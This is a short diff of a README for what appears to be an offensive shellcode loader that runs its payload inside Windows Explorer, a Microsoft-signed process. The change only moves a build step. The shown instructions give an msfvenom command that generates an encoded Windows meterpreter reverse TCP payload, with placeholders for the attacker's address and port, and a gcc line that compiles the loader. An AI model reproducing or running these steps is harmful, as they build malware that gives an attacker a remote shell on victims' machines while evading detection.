@@ -45,9 +45,6 @@ By moving the entire staging and execution into **Explorer**—a Microsoft‑sig
 You’ll need a Windows environment with a MinGW/MSYS2 toolchain:
 
 ```bash
-# Compile loader.c
-gcc loader.c -o loader.exe -lkernel32 -luser32
-
 # Generate the shellcode using Msfvenom
 msfvenom \
   -p windows/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT \
@@ -57,4 +54,7 @@ msfvenom \
   -b "\x00\x0a\x0d" \
   -f c \
   --var-name encrypted > shellcode.txt
+
+# Compile loader.c
+gcc loader.c -o loader.exe -lkernel32 -luser32
 ```
